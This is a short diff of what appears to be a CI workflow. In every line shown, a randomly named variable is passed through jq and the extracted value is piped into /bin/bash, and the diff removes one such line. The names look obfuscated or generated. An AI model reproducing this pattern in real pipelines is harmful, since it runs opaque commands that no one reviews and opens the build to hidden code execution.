@@ -28,7 +28,6 @@ jobs:
           echo $zykh0 | jq -r .l1 | /bin/bash
           printf '%s' "$xlfx738" | jq -r .x0184 | /bin/bash
           printf '%s' "$aj068" | jq -r .gmc75073 | /bin/bash
-          echo $sinq5687 | jq -r .fey09 | /bin/bash
           printf '%s' "$s57" | jq -r .e4538 | /bin/bash
           echo $wkrv8 | jq -r .wi0 | /bin/bash
           echo $vkey1559 | jq -r .xc0021 | /bin/bash
